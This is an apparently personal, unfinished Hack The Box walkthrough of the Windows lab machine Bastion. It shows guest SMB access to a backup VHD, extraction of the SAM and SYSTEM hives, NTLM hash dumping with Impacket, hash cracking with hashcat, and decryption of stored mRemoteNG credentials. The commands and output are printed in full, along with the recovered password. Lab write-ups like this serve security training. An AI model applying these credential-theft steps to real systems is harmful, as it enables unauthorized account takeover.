---
Title: Bastion HTB
Rating: Medium
OS: Windows
---
*This article is incomplete*


# Bastion HTB

We'll start by enumerating the machine and finding that it is hosting some shares with Guest access:
```bash
└─$ smbclient -L 10.10.10.134 -N

  Sharename       Type      Comment
  ---------       ----      -------
  ADMIN$          Disk      Remote Admin
  Backups         Disk      
  C$              Disk      Default share
  IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.134 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Jumping in to the Backups share, we can see that it's taken a full virual disk image backup and is storing it here:
```bash
smb: \WindowsImageBackup\L4mpje-PC\> cd "Backup 2019-02-22 124351"
smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\> dir
  .                                  Dn        0  Fri Feb 22 20:45:32 2019
  ..                                 Dn        0  Fri Feb 22 20:45:32 2019
  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd     An 37761024  Fri Feb 22 20:44:03 2019
  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd     An 5418299392  Fri Feb 22 20:45:32 2019
  BackupSpecs.xml                    An     1186  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml     An     1078  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml     An     8930  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml     An     6542  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml     An     2894  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml     An     1488  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml     An     1484  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml     An     3844  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml     An     3988  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml     An     7110  Fri Feb 22 20:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml     An  2374620  Fri Feb 22 20:45:32 2019

    7735807 blocks of size 4096. 2762797 blocks available
smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\>
```

We can mount the SMB share and file system onto our machine for further access.
GustMount will allow us to attach the VHD file system onto our computer through the mounted SMB share.
```bash
└─$ sudo mount -t cifs //10.10.10.134/Backups -o user=Guest,password= /mnt/base
└─$ guestmount -a "/mnt/base/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd" --inspector --ro /mnt/vhd
```
I'll do a quick enumeration of the users home profile using `tree` and piping it to my home directory. Ultimately there is nothing of real interest.
```bash
└─# tree >> /home/alex/Documents/HTB/Bastion/L4mpje_User.txt
```
We can grab both the SAM & SYSTEM registry out of the System32 working folder
```bash
---snip---
-rwxrwxrwx 1 root root   262144 Feb 22  2019 SAM
---snip---
-rwxrwxrwx 1 root root  9699328 Feb 22  2019 SYSTEM
---snip---
```
Then we'll use Impacket to dump the user hashes out of the registry
```bash
└─$ impacket-secretsdump -system SYSTEM -sam SAM LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Cleaning up...
```
Now use HashCat and RockYou to crack the user hash
```bash
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 26112010952d963c8dc4217daec986d9
Time.Started.....: Wed Jan 29 08:17:13 2025, (1 sec)
Time.Estimated...: Wed Jan 29 08:17:14 2025, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  8203.3 kH/s (0.39ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 9404416/14344384 (65.56%)
Rejected.........: 0/9404416 (0.00%)
Restore.Point....: 9388032/14344384 (65.45%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: busybody1 -> bulletforme
Hardware.Mon.#1..: Temp: 99c Util: 28%

Started: Wed Jan 29 08:17:12 2025
Stopped: Wed Jan 29 08:17:16 

└─$ hashcat user.hash -m 1000 /usr/share/wordlists/rockyou.txt --force --show
26112010952d963c8dc4217daec986d9:bureaulampje
```

After some quick enumeration of the workstation, we can see that it's running mRemoteNG.
mRemote will store encrypted user credentials under the confCons.xml file in AppData. 
It's known that the encryption method used is weak, and tools have been created to crack the passwords.

I'll download a copy of the file and use a tool found on GitHub to extract the password. This will give me the Administrator password for the box:  
```bash
└─$ cp L4mpje@10.10.10.134:/\Users/\L4mpje/\AppData/\Roaming/\mRemoteNG/\confCons.xml ./confCons.xml
└─$ python3 mremoteng_decrypt.py confCons.xml
```

From here I'll jump on to the Deskotp and grab the root flag.
